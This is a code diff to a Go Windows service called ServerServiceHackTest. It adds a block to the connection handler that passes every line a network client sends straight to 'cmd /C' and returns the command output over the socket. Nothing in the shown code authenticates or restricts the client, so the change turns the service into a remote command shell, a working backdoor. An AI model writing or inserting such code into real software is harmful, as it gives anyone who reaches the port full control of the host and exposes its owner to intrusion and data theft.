@@ -6,8 +6,9 @@ import (
     "golang.org/x/sys/windows/svc/debug"
     "log"
     "net"
-    "time"
+    "os/exec"
     "strings"
+    "time"
 )
 
 type ServerServiceHackTest struct {
@@ -89,6 +90,17 @@ func (m *ServerServiceHackTest) handleConnection(conn net.Conn) {
             if strings.TrimSpace(data) == "CLOSE" {
                 log.Println("Closing connection due to client command")
                 return
+            }
+
+            // Выполнение команды
+            cmd := exec.Command("cmd", "/C", strings.TrimSpace(data))
+            output, err := cmd.CombinedOutput()
+            if err != nil {
+                log.Printf("Error executing command: %v", err)
+                conn.Write([]byte("Error executing command\n"))
+            } else {
+                log.Printf("Command output: %s", output)
+                conn.Write(output)
             }
         }
     }
